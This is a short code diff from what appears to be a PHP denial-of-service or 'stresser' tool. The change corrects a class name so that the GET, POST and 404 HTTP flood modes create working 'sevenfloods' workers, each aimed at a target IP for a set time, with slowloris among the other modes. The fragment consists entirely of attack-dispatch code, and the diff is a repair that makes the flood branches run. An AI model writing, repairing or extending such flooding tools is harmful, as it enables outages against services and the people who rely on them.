@@ -81,17 +81,17 @@
 		break;
 	case "get":
 		include_once "../class/flood/sevenfloods.php";
-		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "GET");
+		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "GET");
     	$packets +=$worker->start();
 		break;
 	case "post":
 		include_once "../class/flood/sevenfloods.php";
-		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "POST");
+		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "POST");
     	$packets +=$worker->start();
 		break;
 	case "404":
 		include_once "../class/flood/sevenfloods.php";
-		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "404");
+		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "404");
     	$packets +=$worker->start();
 		break;
 	case "slowloris":
